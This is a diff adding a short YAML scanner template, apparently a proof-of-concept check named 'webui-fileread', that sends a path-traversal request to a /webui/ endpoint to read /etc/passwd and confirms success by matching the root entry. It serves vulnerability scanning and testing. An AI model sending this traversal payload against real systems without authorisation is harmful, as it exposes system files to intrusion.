@@ -1,0 +1,8 @@
+name: poc-yaml-webui-fileread
+rules:
+  - method: GET
+    path: "/webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down"
+    expression: |
+      response.status == 200 && response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+detail:
+  author: 666
